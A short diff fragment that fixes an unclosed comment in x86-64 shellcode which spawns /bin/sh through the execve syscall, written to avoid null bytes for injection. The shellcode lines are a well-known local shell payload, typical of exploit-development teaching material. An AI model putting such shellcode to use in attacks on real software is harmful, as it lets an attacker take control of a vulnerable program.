@@ -21,7 +21,7 @@ mov %rsp,%rdi                   /* get pointer to "\0hs/nib/" on the stack */
 push %rdi                       /* push that pointer to the stack */
 xor %rdx,%rdx                   /* put 0 in rdx */
 push %rdx                       /* push that 0 to the stack */
-mov %rsp,%rsi                   /* move pointer to that 0 to rsi
+mov %rsp,%rsi                   /* move pointer to that 0 to rsi */
 xor %rax,%rax                   /* put 0 in rax to be able to put 3b in rax without useing a null byte*/
 mov $0x3b,%al                   /* move number for exec syscall into lower part of rax */
 syscall                         /* execute the syscal */
